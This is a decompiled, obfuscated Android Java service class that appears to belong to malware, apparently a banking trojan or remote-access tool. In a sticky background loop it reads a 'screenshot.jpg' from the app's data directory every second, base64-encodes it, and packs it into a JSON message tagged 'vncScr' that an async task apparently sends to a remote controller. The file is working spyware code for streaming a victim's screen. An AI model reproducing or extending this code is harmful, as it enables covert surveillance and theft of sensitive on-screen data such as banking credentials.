package com.sonnokta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;

import fddo.Cbreak;
import fddo.Cgoto;
import fddo.Cthis;

import com.sonnokta.utils.LogUtil;

import java.io.File;
import java.io.FileInputStream;

import org.json.JSONException;
import org.json.JSONObject;

public class p044i extends Service {
    private static String TAG = "bwolf-p044i";

    /* renamed from: fddo  reason: collision with root package name */
    private static final String f97fddo = Cbreak.fddo("00fce64f32cdc1fd7d36ba334466261b91b471");
    public static boolean ifdf = false;

    class fddo implements Runnable {
        fddo() {
        }

        public void run() {
            Looper.prepare();
            do {
                try {
                    p044i p044i = p044i.this;
                    p044i.fddo(p044i.getApplicationContext());
                    Cgoto.p(1000);
                } catch (Exception unused) {
                    return;
                }
            } while (p044i.ifdf);
        }
    }

    public void fddo(Context context) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");

        try {
            File file = new File(context.getApplicationInfo().dataDir, "screenshot.jpg");
            if (file.exists()) {
                FileInputStream fileInputStream = new FileInputStream(file);
                int length = (int) file.length();
                byte[] bArr = new byte[length];
                int i = 0;
                while (i < length) {
                    int read = fileInputStream.read(bArr, i, length - i);
                    if (read < 0) {
                        break;
                    }
                    i += read;
                }
                if (i >= length) {
                    fileInputStream.close();
                    ifdf(context, bArr, "screenshot.jpg");
                }
            }
        } catch (Exception unused) {
        }
    }

    public void ifdf(Context context, byte[] bArr, String str) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "vncScr");
            jSONObject.put("fn", str);
            jSONObject.put("bs", Base64.encodeToString(bArr, 0));
            new Cthis(context, jSONObject).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        } catch (JSONException unused) {
        }
    }

    public IBinder onBind(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onBind ---");
        return null;
    }

    public void onDestroy() {
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
        ifdf = false;
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        LogUtil.showErrorLog(TAG, "--- onStartCommand ---");
        if (intent == null || !p067x.f27this || ifdf) {
            return Service.START_NOT_STICKY;
        }
        ifdf = true;
        p041i.fddo(getApplicationContext(), this);
        p041i.m24for(getApplicationContext());
        new Thread(new fddo()).start();
        return Service.START_STICKY;
    }

    public void onTaskRemoved(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onTaskRemoved ---");
        ifdf = false;
        super.onTaskRemoved(intent);
    }
}
